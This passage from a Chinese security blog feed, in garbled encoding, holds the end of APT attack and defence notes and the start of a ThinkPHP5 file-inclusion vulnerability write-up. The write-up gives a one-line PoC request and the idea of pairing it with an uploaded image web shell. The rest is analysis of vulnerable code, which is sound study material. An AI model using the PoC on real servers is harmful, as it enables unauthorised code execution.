çš„å¿«æ·æ–¹å¼æ–‡ä»¶æ‰“åŒ…æˆä¸€ä¸ªå‹ç¼©åŒ…ï¼ŒåŒæ—¶ï¼Œå¿«æ·æ–¹å¼çš„å‘½åå…·æœ‰è¿·æƒ‘æ€§</li></ul></li><li><p>æ†ç»‘åˆæ³•ç¨‹åº</p><ul><li><p>AWVS7</p><ul><li>é’ˆå¯¹ç½‘ç»œå®‰å…¨è¡Œä¸š</li></ul></li><li><p>åŠå…¬è½¯ä»¶</p><ul><li>æ”¿åºœå•ä½ã€äº‹ä¸šå•ä½</li></ul></li><li><p>å³æ—¶é€šã€è¯ä¹¦é©±åŠ¨</p><ul><li>æ”¿åºœæœºæ„</li></ul></li><li><p>å¾®è½¯æ›´æ–°ç¨‹åº</p></li><li><p>Microsoft Visio Professional 2013</p></li></ul></li><li><p>å‹ç¼©åŒ…å¤–å£³</p><ul><li>å°†æœ¨é©¬ç¨‹åºè¿›è¡Œå‹ç¼©ï¼Œä»¥å‹ç¼©åŒ…çš„å½¢å¼ä¼ æ’­</li></ul></li></ul><h3 id="åä¾¦å¯Ÿæœ¯"><a href="#åä¾¦å¯Ÿæœ¯" class="headerlink" title="åä¾¦å¯Ÿæœ¯"></a>åä¾¦å¯Ÿæœ¯</h3><ul><li>ä¸€äº›APTç»„ç»‡çš„æ”»å‡»æœ¨é©¬ä¼šåˆ¤æ–­è‡ªèº«æ‰€å¤„çš„ç¯å¢ƒã€å‘ç°æ€è½¯æ—¶ã€ä¼šé€‰æ‹©æ”¾å¼ƒæ‰§è¡Œåç»­çš„åŠŸèƒ½ä»£ç ã€æˆ–è€…è®¾æ³•ç»•è¿‡æ€è½¯çš„ç›‘æµ‹ã€‚</li><li>ä¸€äº›APTç»„ç»‡ä¼šå¯¹å®‰å…¨ç ”ç©¶äººå‘˜è¿›è¡Œåå‘ä¾¦å¯Ÿå·¥ä½œï¼Œæ¯”å¦‚æµ·è²èŠ±ç»„ç»‡å‘AWVSçš„ç ´è§£ç‰ˆä¸­æ’å…¥äº†æœ¨é©¬ã€‚</li></ul><h2 id="APTæ”»å‡»çš„ç›‘æµ‹ä¸é˜²å¾¡"><a href="#APTæ”»å‡»çš„ç›‘æµ‹ä¸é˜²å¾¡" class="headerlink" title="APTæ”»å‡»çš„ç›‘æµ‹ä¸é˜²å¾¡"></a>APTæ”»å‡»çš„ç›‘æµ‹ä¸é˜²å¾¡</h2><h3 id="å¦‚ä½•å‘ç°APTæ”»å‡»"><a href="#å¦‚ä½•å‘ç°APTæ”»å‡»" class="headerlink" title="å¦‚ä½•å‘ç°APTæ”»å‡»"></a>å¦‚ä½•å‘ç°APTæ”»å‡»</h3><ul><li><p>å¤§æ•°æ®æŠ€æœ¯</p><ul><li>æ•°æ®é‡‡é›†ã€æ•°æ®åˆ†æã€æ•°æ®å‘ˆç°</li></ul></li><li><p>å¨èƒæƒ…æŠ¥æŠ€æœ¯</p><ul><li><p>â€œæ ‡å¿—â€(Indicator of Compromise,IOC),ä¹Ÿå«å…¥ä¾µæŒ‡ç¤ºå™¨ï¼šé€šå¸¸åŒ…æ‹¬ä¸»æœºæ´»åŠ¨ä¸­å‡ºç°çš„æ–‡ä»¶ã€è¿›ç¨‹ã€æ³¨å†Œè¡¨é”®å€¼ã€ç³»ç»ŸæœåŠ¡ã€ç½‘ç»œä¸Šçš„åŸŸåã€URLã€IPç­‰</p></li><li><p>åˆ†ç±»</p><ul><li><p>æˆ˜æœ¯æƒ…æŠ¥</p><ul><li>æ ‡è®°æ”»å‡»è€…ä½¿ç”¨å·¥å…·ç›¸å…³çš„ç‰¹çº¸å€¼åŠç½‘ç»œåŸºç¡€è®¾æ–½ä¿¡æ¯ã€å¯ç›´æ¥ç”¨äºè®¾å¤‡ã€å®ç°å¯¹æ”»å‡»æ´»åŠ¨çš„ç›‘æ§ï¼ŒIOCå³æ˜¯ä¸€ä¸ªå…¸å‹</li></ul></li><li><p>ä½œæˆ˜æƒ…æŠ¥</p><ul><li>æè¿°æ”»å‡»è€…çš„å·¥å…·ã€æŠ€æœ¯å’Œè¿‡ç¨‹ï¼Œå³TTP</li></ul></li><li><p>æˆ˜ç•¥æƒ…æŠ¥</p><ul><li>æè¿°å½“å‰å¯¹äºç‰¹å®šç»„ç»‡çš„å¨èƒç±»å‹å’Œå¯¹æ‰‹ç°çŠ¶ã€æŒ‡å¯¼å®‰å…¨æŠ•èµ„çš„å¤§æ–¹å‘ã€‚ä½¿ç”¨è€…ä¸ºCSO(Chief Security Officer), CISO(Chief Information Security Offier)</li></ul></li></ul></li><li><p>å¨èƒæƒ…æŠ¥çš„åˆ©ç”¨</p><ul><li><p>~åœ¨å‡†å¤‡é˜¶æ®µã€æ£€æµ‹ä¸åˆ†æé˜¶æ®µã€éš”ç¦»ï¼Œæ¸…é™¤ï¼Œä¸æ¢å¤é˜¶æ®µã€äº‹åå¤ç›˜é˜¶æ®µçš„ä½œç”¨</p></li><li><p>å®‰å…¨è¿è¥å›¢é˜Ÿä¼šé‡åˆ°çš„é—®é¢˜</p><ul><li>å¦‚ä½•é«˜æ•ˆåœ°å‘ç°æ”»å‡»å’Œå…¥ä¾µæ´»åŠ¨ï¼Œè¯„ä¼°å½±å“é¢</li><li>å¦‚ä½•è·å–ã€å¤„ç½®ä¸å·²ç»å‘ç°å®‰å…¨äº‹ä»¶ç›¸å…³çš„æ´»åŠ¨</li><li>å¦‚ä½•åŸºäºå¯¹å¯¹æ‰‹çš„äº†è§£ã€è®¾ç½®å„ä¸ªç¯èŠ‚ä¸Šçš„å®‰å…¨æ§åˆ¶æªæ–½ã€ä»¥é˜»æ­¢ç›¸åŒå¯¹æ‰‹æˆ–ç±»ä¼¼æ”»å‡»æ‰‹æ³•çš„å…¥ä¾µ</li><li>ç†è§£ç›®å‰å®‰å…¨å¨èƒçš„å…¨è²Œã€å®ç°æœ‰æ•ˆçš„å®‰å…¨æŠ•èµ„</li></ul></li></ul></li></ul></li><li><p>æµé‡å¨èƒæ£€æµ‹æŠ€æœ¯</p><ul><li>æµé‡å¨èƒåˆ†æ</li><li>æµé‡æ—¥å¿—å­˜å‚¨</li><li>å¨èƒå›æº¯åˆ†æ</li></ul></li><li><p>ç½‘ç»œæ£€æµ‹å“åº”æŠ€æœ¯(Network-based Detection and Response,NDR)</p></li><li><p>ç»ˆç«¯æ£€æµ‹å“åº”æŠ€æœ¯(Endpoint Detection and Response,EDR)</p><ul><li>åŸºäºç»ˆç«¯å¤§æ•°æ®åˆ†æçš„æ–°ä¸€ä»£ç»ˆç«¯å®‰å…¨äº§å“ï¼Œèƒ½å¯¹ç»ˆç«¯è¡Œä¸ºæ•°æ®è¿›è¡Œå…¨é¢é‡‡é›†ã€å®æ—¶ä¸Šä¼ ã€å¯¹ç»ˆç«¯è¿›è¡ŒæŒç»­æ£€æµ‹å’Œåˆ†æã€å¢å¼ºå¯¹å†…éƒ¨å¨èƒäº‹ä»¶çš„æ·±åº¦å¯è§æ€§ï¼Œç»“åˆç›¸å…³å¨èƒæƒ…æŠ¥ä¸­å¿ƒæ¨é€çš„æƒ…æŠ¥ä¿¡æ¯(IPã€URLã€æ–‡ä»¶Hashç­‰)èƒ½å¸®åŠ©ä¼ä¸šå¿«é€Ÿå‘ç°ï¼Œç²¾ç¡®å®šä½é«˜çº§å¨èƒå…¥ä¾µ</li></ul></li></ul><h3 id="å¦‚ä½•åˆ†æAPTæ”»å‡»"><a href="#å¦‚ä½•åˆ†æAPTæ”»å‡»" class="headerlink" title="å¦‚ä½•åˆ†æAPTæ”»å‡»"></a>å¦‚ä½•åˆ†æAPTæ”»å‡»</h3><ul><li><p>ç½‘ç»œæ€ä¼¤é“¾æ¨¡å‹(Cyber Kill Chain)</p><ul><li><p>ä¾¦å¯Ÿ</p><ul><li>æ”»å‡»è€…é€‰æ‹©ç›®æ ‡ã€è¿›è¡Œç ”ç©¶ã€æœé›†ç›®æ ‡å¼±ç‚¹</li></ul></li><li><p>æ­¦å™¨åŒ–</p><ul><li>æ”»å‡»è€…åˆ›å»ºé’ˆå¯¹ä¸€ä¸ªæˆ–å¤šä¸ªæ¼æ´å®šåˆ¶çš„è¿œç¨‹è®¿é—®æ¶æ„ç¨‹åºæ­¦å™¨ï¼Œæ¯”å¦‚ç—…æ¯’æˆ–è •è™«</li></ul></li><li><p>æ•£å¸ƒ</p><ul><li>å°†ç½‘ç»œæ­¦å™¨åŒ…å‘ç›®æ ‡æŠ•æ”¾</li></ul></li><li><p>æ¶ç”¨</p><ul><li>åœ¨å—å®³è€…ç³»ç»Ÿä¸Šè¿è¡Œä»£ç </li></ul></li><li><p>è®¾ç½®</p><ul><li>åœ¨ç›®æ ‡ä½ç½®å®‰è£…æ¶æ„ç¨‹åº</li></ul></li><li><p>å‘½ä»¤å’Œæ§åˆ¶</p><ul><li>ä¸ºæ”»å‡»è€…å»ºç«‹å¯è¿œç¨‹æ§åˆ¶ç›®æ ‡ç³»ç»Ÿçš„è·¯å¾„</li></ul></li><li><p>ç›®æ ‡è¾¾æˆ</p><ul><li>æ”»å‡»è€…è¿œç¨‹å®Œæˆå…¶é¢„æœŸæ•ˆæœ</li></ul></li></ul></li><li><p>é’»çŸ³æ¨¡å‹</p><ul><li><p>æ”»å‡»è€…</p><ul><li>åˆ†æ¸…æ”»å‡»è€…æœ‰åˆ©ç”¨äº†è§£å…¶ç›®çš„ã€å½’å±ã€é€‚åº”æ€§å’ŒæŒä¹…æ€§</li></ul></li><li><p>èƒ½åŠ›</p><ul><li>äº‹ä»¶ä¸­ä½¿ç”¨çš„å·¥å…·æˆ–æŠ€æœ¯</li></ul></li><li><p>åŸºç¡€è®¾æ–½</p><ul><li>æ”»å‡»è€…ç”¨æ¥ä¼ é€’èƒ½åŠ›çš„ç‰©ç†æˆ–é€»è¾‘ç»“æ„ï¼Œå¦‚IPåœ°å€ã€åŸŸåã€é‚®ä»¶åœ°å€ã€USBè®¾å¤‡ç­‰</li></ul></li><li><p>å—å®³è€…</p><ul><li>ä»¥ç¤¾ä¼š-æ”¿æ²»ä¸ºæ”¯ç‚¹çš„å®‰å…¨åˆ†æä¸­ï¼Œå—å®³è€…ä½œç”¨é‡å¤§</li></ul></li></ul></li><li><p>è‡ªé€‚åº”å®‰å…¨æ¶æ„(Adaptive Security Architecture,ASA)</p><ul><li>ç”±ç¾å›½å®‰å…¨å…¬å¸Gartneräº2014å¹´æå‡ºçš„é¢å‘æœªæ¥çš„ä¸‹ä¸€ä»£å®‰å…¨æ¶æ„ï¼Œä»é¢„æµ‹ã€é˜²å¾¡ã€æ£€æµ‹ã€å“åº”å››ä¸ªç»´åº¦ï¼Œå¼ºåº¦å®‰å…¨é˜²æŠ¤æ˜¯ä¸€ä¸ªæŒç»­å¤„ç†ã€å¾ªç¯çš„è¿‡ç¨‹ï¼Œæ˜¯ç»†ç²’åº¦ã€å¤šè§’åº¦ã€æŒç»­åŒ–åœ°å¯¹å®‰å…¨å¨èƒè¿›è¡Œå®æ—¶åŠ¨æ€åˆ†æ</li><li>ç›®çš„ï¼šä¸ºäº†è§£å†³å½“å‰ä¼ä¸šçš„å®‰å…¨é˜²æŠ¤åŠŸèƒ½éš¾ä»¥åº”å¯¹é«˜çº§å®šå‘æ”»å‡»çš„é—®é¢˜</li><li>æœ€ç»ˆæ•ˆæœï¼šè¾¾åˆ°ç½‘ç»œå®‰å…¨çš„å¯ç®¡ã€å¯æ§ã€å¯è§†ã€å¯è°ƒåº¦ã€å¯æŒç»­</li></ul></li></ul><h3 id="ååŒè”åŠ¨çš„çºµæ·±é˜²å¾¡ä½“ç³»"><a href="#ååŒè”åŠ¨çš„çºµæ·±é˜²å¾¡ä½“ç³»" class="headerlink" title="ååŒè”åŠ¨çš„çºµæ·±é˜²å¾¡ä½“ç³»"></a>ååŒè”åŠ¨çš„çºµæ·±é˜²å¾¡ä½“ç³»</h3><ul><li><p>é«˜çº§å®‰å…¨å¨èƒçš„åˆ¤å®š</p><ul><li>ç»“åˆå¤šæºå¤´å¨èƒæƒ…æŠ¥åº”ç”¨ã€æ²™ç®±åŠ¨æ€è¡Œä¸ºå‘ç°ã€å…³è”å¼•æ“åˆ†æ</li></ul></li><li><p>å®‰å…¨å¨èƒçš„å¤„ç½®</p><ul><li>NDRä¸EDRè”åŠ¨</li></ul></li></ul><h2 id="APTæ”»å‡»æŠ€æœ¯-è¶‹åŠ¿"><a href="#APTæ”»å‡»æŠ€æœ¯-è¶‹åŠ¿" class="headerlink" title="APTæ”»å‡»æŠ€æœ¯(è¶‹åŠ¿)"></a>APTæ”»å‡»æŠ€æœ¯(è¶‹åŠ¿)</h2><h3 id="æŠ€æœ¯è¶Šå‘é«˜è¶…"><a href="#æŠ€æœ¯è¶Šå‘é«˜è¶…" class="headerlink" title="æŠ€æœ¯è¶Šå‘é«˜è¶…"></a>æŠ€æœ¯è¶Šå‘é«˜è¶…</h3><ul><li><p>éPEæ–‡ä»¶æ–‡ä»¶æ”»å‡»</p><ul><li>æ–‡ä»¶æ— éœ€é•¿æœŸé©»ç•™ç£ç›˜</li><li>æ ¸å¿ƒPayloadå­˜æ”¾åœ¨ç½‘ç»œæˆ–æ³¨å†Œè¡¨</li><li>é€šè¿‡ç³»ç»Ÿè¿›ç¨‹æ‰§è¡ŒPayload</li></ul></li><li><p>å¼€æºå·¥å…·å’Œè‡ªåŠ¨åŒ–æ”»å‡»æ¡†æ¶</p><ul><li><p>PowerShellè‡ªåŠ¨åŒ–æ”»å‡»æ¡†æ¶</p></li><li><p>CobaltStrike</p><ul><li>Shellcode</li><li>Beacon</li></ul></li><li><p>Koadic</p></li></ul></li><li><p>â€œLiving off the landâ€æŠ€æœ¯</p></li></ul><h3 id="å›½é™…å†²çªåœ°åŒºçš„APTæ”»å‡»æ›´åŠ æ´»è·ƒ"><a href="#å›½é™…å†²çªåœ°åŒºçš„APTæ”»å‡»æ›´åŠ æ´»è·ƒ" class="headerlink" title="å›½é™…å†²çªåœ°åŒºçš„APTæ”»å‡»æ›´åŠ æ´»è·ƒ"></a>å›½é™…å†²çªåœ°åŒºçš„APTæ”»å‡»æ›´åŠ æ´»è·ƒ</h3><ul><li>èƒ½æºèµ„æºã€å·¥ä¸šã€æŒæœ‰ä¸åŒæ”¿è§è€…</li><li>è¿™ç±»APTç»„ç»‡ï¼šé»„é‡‘é¼ ã€äººé¢ç‹®ã€APT33ã€APT34ç­‰</li></ul><h3 id="ç½‘ç»œç©ºé—´å·²æˆä¸ºå¤§å›½åšå¼ˆæ–°æˆ˜åœº"><a href="#ç½‘ç»œç©ºé—´å·²æˆä¸ºå¤§å›½åšå¼ˆæ–°æˆ˜åœº" class="headerlink" title="ç½‘ç»œç©ºé—´å·²æˆä¸ºå¤§å›½åšå¼ˆæ–°æˆ˜åœº"></a>ç½‘ç»œç©ºé—´å·²æˆä¸ºå¤§å›½åšå¼ˆæ–°æˆ˜åœº</h3><ul><li>å½±å“é¢ï¼šæ”¿æ²»ã€ç»æµã€å†›äº‹è°ˆåˆ¤ç­‰</li></ul><h3 id="é’ˆå¯¹åŸºç¡€è®¾æ–½çš„ç ´åæ€§æ”»å‡»æ—¥ç›Šæ´»è·ƒ"><a href="#é’ˆå¯¹åŸºç¡€è®¾æ–½çš„ç ´åæ€§æ”»å‡»æ—¥ç›Šæ´»è·ƒ" class="headerlink" title="é’ˆå¯¹åŸºç¡€è®¾æ–½çš„ç ´åæ€§æ”»å‡»æ—¥ç›Šæ´»è·ƒ"></a>é’ˆå¯¹åŸºç¡€è®¾æ–½çš„ç ´åæ€§æ”»å‡»æ—¥ç›Šæ´»è·ƒ</h3><ul><li>â€œäº’è”ç½‘+â€ã€5Gã€ä¸‡ç‰©äº’è”ç­‰æ–°å…´æŠ€æœ¯çš„å…´èµ·</li><li>æ¶‰åŠè¡Œä¸šï¼šèƒ½æºã€äº¤é€šã€åˆ¶é€ ã€é‡‘èã€é€šä¿¡ç­‰é¢†åŸŸ</li><li>ç°çŠ¶ï¼šå¾ˆå¤šåŸºç¡€è®¾æ–½å’Œç”Ÿäº§ç³»ç»Ÿçš„ç½‘ç»œå®‰å…¨ä½“ç³»å»ºè®¾è¿˜åŸºæœ¬ä¸ºé›¶</li></ul><h3 id="é’ˆå¯¹ä¸ªäººç§»åŠ¨ç»ˆç«¯æ”»å‡»æ˜¾è‘—å¢åŠ "><a href="#é’ˆå¯¹ä¸ªäººç§»åŠ¨ç»ˆç«¯æ”»å‡»æ˜¾è‘—å¢åŠ " class="headerlink" title="é’ˆå¯¹ä¸ªäººç§»åŠ¨ç»ˆç«¯æ”»å‡»æ˜¾è‘—å¢åŠ "></a>é’ˆå¯¹ä¸ªäººç§»åŠ¨ç»ˆç«¯æ”»å‡»æ˜¾è‘—å¢åŠ </h3><ul><li>iOSã€Android</li><li>ç³»ç»Ÿæ¼æ´ã€ç¤¾ä¼šå·¥ç¨‹å­¦</li><li>å…¸å‹ä¾‹å­ï¼šâ€œä¸‰å‰æˆŸæ¼æ´â€</li></ul><h2 id="å…¸å‹çš„APTç»„ç»‡æœºæ„"><a href="#å…¸å‹çš„APTç»„ç»‡æœºæ„" class="headerlink" title="å…¸å‹çš„APTç»„ç»‡æœºæ„"></a>å…¸å‹çš„APTç»„ç»‡æœºæ„</h2><h3 id="æ–¹ç¨‹å¼"><a href="#æ–¹ç¨‹å¼" class="headerlink" title="æ–¹ç¨‹å¼"></a>æ–¹ç¨‹å¼</h3><h3 id="ç´¢ä¼¦ä¹‹çœ¼"><a href="#ç´¢ä¼¦ä¹‹çœ¼" class="headerlink" title="ç´¢ä¼¦ä¹‹çœ¼"></a>ç´¢ä¼¦ä¹‹çœ¼</h3><h3 id="APT28"><a href="#APT28" class="headerlink" title="APT28"></a>APT28</h3><h3 id="Lazarus"><a href="#Lazarus" class="headerlink" title="Lazarus"></a>Lazarus</h3><h3 id="Group123"><a href="#Group123" class="headerlink" title="Group123"></a>Group123</h3><h2 id="å½“ç„¶è¿˜æœ‰å¾ˆå¤šç³»ç»Ÿçº§åˆ«çš„æ¼æ´ï¼Œè¿™é‡Œä¸ºä»€ä¹ˆç»å¸¸ç”¨åˆ°çš„éƒ½æ˜¯Officeç›¸å…³çš„ï¼Œæˆ‘ä¸ªäººè®¤ä¸ºæ˜¯APTéœ€è¦å‰æœŸå¤§é‡çš„é±¼å‰æ”»å‡»æ¥è·å–çœŸå®çš„ç›®æ ‡ä¿¡æ¯ï¼Œè€ŒOfficeåœ¨å¤§éƒ¨åˆ†æ”»å‡»ç›®æ ‡çš„æœºå™¨ä¸Šåº”è¯¥éƒ½æœ‰ï¼Œä½œç”¨èŒƒå›´æ¯”è¾ƒå¤§ï¼ŒæˆåŠŸç‡é«˜çš„åŸå› å§ã€‚"><a href="#å½“ç„¶è¿˜æœ‰å¾ˆå¤šç³»ç»Ÿçº§åˆ«çš„æ¼æ´ï¼Œè¿™é‡Œä¸ºä»€ä¹ˆç»å¸¸ç”¨åˆ°çš„éƒ½æ˜¯Officeç›¸å…³çš„ï¼Œæˆ‘ä¸ªäººè®¤ä¸ºæ˜¯APTéœ€è¦å‰æœŸå¤§é‡çš„é±¼å‰æ”»å‡»æ¥è·å–çœŸå®çš„ç›®æ ‡ä¿¡æ¯ï¼Œè€ŒOfficeåœ¨å¤§éƒ¨åˆ†æ”»å‡»ç›®æ ‡çš„æœºå™¨ä¸Šåº”è¯¥éƒ½æœ‰ï¼Œä½œç”¨èŒƒå›´æ¯”è¾ƒå¤§ï¼ŒæˆåŠŸç‡é«˜çš„åŸå› å§ã€‚" class="headerlink" title="å½“ç„¶è¿˜æœ‰å¾ˆå¤šç³»ç»Ÿçº§åˆ«çš„æ¼æ´ï¼Œè¿™é‡Œä¸ºä»€ä¹ˆç»å¸¸ç”¨åˆ°çš„éƒ½æ˜¯Officeç›¸å…³çš„ï¼Œæˆ‘ä¸ªäººè®¤ä¸ºæ˜¯APTéœ€è¦å‰æœŸå¤§é‡çš„é±¼å‰æ”»å‡»æ¥è·å–çœŸå®çš„ç›®æ ‡ä¿¡æ¯ï¼Œè€ŒOfficeåœ¨å¤§éƒ¨åˆ†æ”»å‡»ç›®æ ‡çš„æœºå™¨ä¸Šåº”è¯¥éƒ½æœ‰ï¼Œä½œç”¨èŒƒå›´æ¯”è¾ƒå¤§ï¼ŒæˆåŠŸç‡é«˜çš„åŸå› å§ã€‚"></a>å½“ç„¶è¿˜æœ‰å¾ˆå¤šç³»ç»Ÿçº§åˆ«çš„æ¼æ´ï¼Œè¿™é‡Œä¸ºä»€ä¹ˆç»å¸¸ç”¨åˆ°çš„éƒ½æ˜¯Officeç›¸å…³çš„ï¼Œæˆ‘ä¸ªäººè®¤ä¸ºæ˜¯APTéœ€è¦å‰æœŸå¤§é‡çš„é±¼å‰æ”»å‡»æ¥è·å–çœŸå®çš„ç›®æ ‡ä¿¡æ¯ï¼Œè€ŒOfficeåœ¨å¤§éƒ¨åˆ†æ”»å‡»ç›®æ ‡çš„æœºå™¨ä¸Šåº”è¯¥éƒ½æœ‰ï¼Œä½œç”¨èŒƒå›´æ¯”è¾ƒå¤§ï¼ŒæˆåŠŸç‡é«˜çš„åŸå› å§ã€‚</h2><p><em>XMind - Trial Version</em></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200922011215.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;ã€Šé€è§†APTã€‹&quot;&gt;&lt;a href=&quot;#ã€Šé€è§†APTã€‹&quot; class=&quot;hea</summary>
      
    
    
    
    
    <category term="APT" scheme="https://hack-for.fun/tags/APT/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5æ¼æ´å­¦ä¹ -æ–‡ä»¶åŒ…å«æ¼æ´</title>
    <link href="https://hack-for.fun/8d0f.html"/>
    <id>https://hack-for.fun/8d0f.html</id>
    <published>2020-09-16T05:10:50.000Z</published>
    <updated>2020-09-16T15:59:09.731Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h2 id="ThinkPHP5æ–‡ä»¶åŒ…å«æ¼æ´"><a href="#ThinkPHP5æ–‡ä»¶åŒ…å«æ¼æ´" class="headerlink" title="ThinkPHP5æ–‡ä»¶åŒ…å«æ¼æ´"></a>ThinkPHP5æ–‡ä»¶åŒ…å«æ¼æ´</h2><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;public&#x2F;index.php&#x2F;index&#x2F;index?cacheFile&#x3D;favicon.ico</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916231827.png" alt="image-20200916135216791"></p><p>å¯é…åˆæ–‡ä»¶ä¸Šä¼ å›¾ç‰‡é©¬ï¼ŒGetShellã€‚(PHP æ–‡ä»¶åŒ…å«éƒ½è®²æ–‡ä»¶å½“åšphpåç¼€æ–‡ä»¶è¿›è¡Œè§£æï¼Œä¸å®é™…æ–‡ä»¶ç±»å‹æ— å…³)</p><h2 id="æ¼æ´æ¦‚è¿°"><a href="#æ¼æ´æ¦‚è¿°" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><p>æ¼æ´å­˜åœ¨äº <strong>ThinkPHP</strong> æ¨¡æ¿å¼•æ“ä¸­ï¼Œåœ¨åŠ è½½æ¨¡ç‰ˆè§£æå˜é‡æ—¶å­˜åœ¨<strong>å˜é‡è¦†ç›–</strong>é—®é¢˜ï¼Œè€Œä¸”ç¨‹åºæ²¡æœ‰å¯¹æ•°æ®è¿›è¡Œå¾ˆå¥½çš„è¿‡æ»¤ï¼Œæœ€ç»ˆå¯¼è‡´ <strong>æ–‡ä»¶åŒ…å«æ¼æ´</strong> çš„äº§ç”Ÿã€‚</p><ul><li>å˜é‡è¦†ç›–æ¼æ´</li></ul><p><a href="https://www.cnblogs.com/wangtanzhi/p/12748967.html">https://www.cnblogs.com/wangtanzhi/p/12748967.html</a></p><p><strong>å¦‚æœæ²¡æœ‰æŒ‡å®š flagsï¼Œåˆ™è¢«å‡å®šä¸º EXTR_OVERWRITEã€‚</strong></p><p>ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$auth = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">extract($_GET)ï¼›</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($auth==<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;private!&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;public!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>è¿™ç§æƒ…å†µæ²¡æœ‰æŒ‡å®š flagsï¼Œåˆ™è¢«å‡å®šä¸º EXTR_OVERWRITE</strong></p><p>å‡è®¾ç”¨æˆ·æ„é€ ä»¥ä¸‹é“¾æ¥ï¼š<a href="http://www.a.com/test1.php?auth=1">http://www.a.com/test1.php?auth=1</a><br>ç•Œé¢ä¸Šä¼šæ‰“å°å‡ºprivateï¼</p><p>å®‰å…¨çš„åšæ³•æ˜¯ç¡®å®šregister_globals=OFFåï¼Œåœ¨è°ƒç”¨extract()æ—¶ä½¿ç”¨EXTR_SKIPä¿è¯å·²æœ‰å˜é‡ä¸ä¼šè¢«è¦†ç›–ã€‚<br>ps:<br>PHP extract() å‡½æ•°ä»æ•°ç»„ä¸­æŠŠå˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ä¸­ã€‚å¯¹äºæ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œé”®åç”¨äºå˜é‡åï¼Œé”®å€¼ç”¨äºå˜é‡å€¼ã€‚</p><h2 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><p><strong>5.0.0&lt;=ThinkPHP5&lt;=5.0.18</strong> ã€<strong>5.1.0&lt;=ThinkPHP&lt;=5.1.10</strong> </p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>è¿™é‡Œä»¥<code>ThinkPHP 5.0.18</code>  è¿›è¡Œåˆ†æã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916184327.png" alt="image-20200916153529187"></p><p>åœ¨å†å²<code>Releases</code> ä¿¡æ¯ä¸­ï¼Œæ‰¾åˆ°äº† <code>5.0.19</code> ä¸­ï¼Œæ”¹è¿›äº† æ¨¡æ¿å¼•æ“çš„ä¸€å¤„å¯èƒ½çš„å®‰å…¨éšæ‚£ã€‚</p><p><code>/library/think/template/driver/File.php</code> ä¸­çš„ <code>File</code> ç±»ä¸­çš„<code>read</code> æ–¹æ³•ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185031.png" alt="image-20200916161144712"></p><ul><li>ç”¨æˆ·Getæäº¤çš„æ•°æ®éƒ½ä¼šé€šè¿‡<code>input</code> æ–¹æ³•è·å–æ•°æ®ï¼Œç„¶åé€šè¿‡<code>filterValue</code> æ–¹æ³•è¿›è¡Œè¿‡æ»¤å’Œå¼ºåˆ¶ç±»å‹è½¬æ¢ã€‚</li><li>åœ¨ä¿®æ”¹åçš„ä»£ç ä¸‹æ–­ç‚¹ï¼Œç„¶åçœ‹æ–¹æ³•è°ƒç”¨å’Œå‚æ•°ä¼ é€’ã€‚å¦‚ä¸‹å›¾ï¼š</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185043.png" alt="image-20200916163325855"></p><p>åœ¨<code>../application/index/index/controller/index.php</code> ä¸­ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;assign(request()-&gt;get());</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch(); <span class="comment">// 